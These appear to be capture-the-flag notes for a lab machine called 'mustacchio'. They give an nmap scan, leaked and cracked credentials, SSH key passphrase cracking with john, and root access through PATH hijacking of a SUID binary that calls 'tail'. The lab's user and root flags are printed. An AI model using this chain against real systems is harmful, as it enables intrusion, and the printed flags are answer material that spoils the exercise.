
nmap
```
└─$ sudo nmap -sV -Pn 10.10.63.45
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-20 13:30 PDT
Nmap scan report for 10.10.63.45
Host is up (0.18s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
8765/tcp open  ultraseek-http

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.98 seconds

```

/robots.txt
```
User-agent: *
Disallow: /
```

users.bak
`admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
`

`admin:bulldog19`

10.10.63.45:8765

http://10.10.63.45:8765/home.php

 `<!-- Barry, you can now SSH in using your key!-->`


in source of /home.php
`  //document.cookie = "Example=/auth/dontforget.bak";`
`wget http://10.10.136.208:8765/auth/dontforget.bak `
```
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>

```

```
└─$ ./john --wordlist=/usr/share/wordlists/rockyou.txt ../../mustacchio/john_key                                   
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
urieljames       (../../mustacchio/key)     
1g 0:00:00:00 DONE (2022-02-04 11:11) 1.639g/s 4869Kp/s 4869Kc/s 4869KC/s urielvaltierra..urielanaya
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

`ssh barry@10.10.136.208 -i key`:`urieljames`

```
barry@mustacchio:~$ cat user.txt
62d77a4d5f97d47c5aa38b3b2651b831
```

`/home/joe/live_log`

```
barry@mustacchio:/home$ cd joe
barry@mustacchio:/home/joe$ ls -la
total 28
drwxr-xr-x 2 joe  joe   4096 Jun 12  2021 .
drwxr-xr-x 4 root root  4096 Jun 12  2021 ..
-rwsr-xr-x 1 root root 16832 Jun 12  2021 live_log
barry@mustacchio:/home/joe$ strings live_log
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
printf
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
Live Nginx Log Reader
tail -f /var/log/nginx/access.log
:*3$"
GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8060
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
demo.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment

```

```
barry@mustacchio:/home/joe$ cd /tmp
barry@mustacchio:/tmp$ vim tail
barry@mustacchio:/tmp$ chmod +x tail
barry@mustacchio:/tmp$ export PATH="/tmp:$PATH"
barry@mustacchio:/tmp$ $PATH
-bash: /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin: No such file or directory
barry@mustacchio:/tmp$ cd /home/joe
barry@mustacchio:/home/joe$ ls
live_log
barry@mustacchio:/home/joe$ ./live_log
root@mustacchio:/home/joe# cd /root
root@mustacchio:/root# ls
root.txt
root@mustacchio:/root# cat root.txt
3223581420d906c4dd1a5f9b530393a5

```
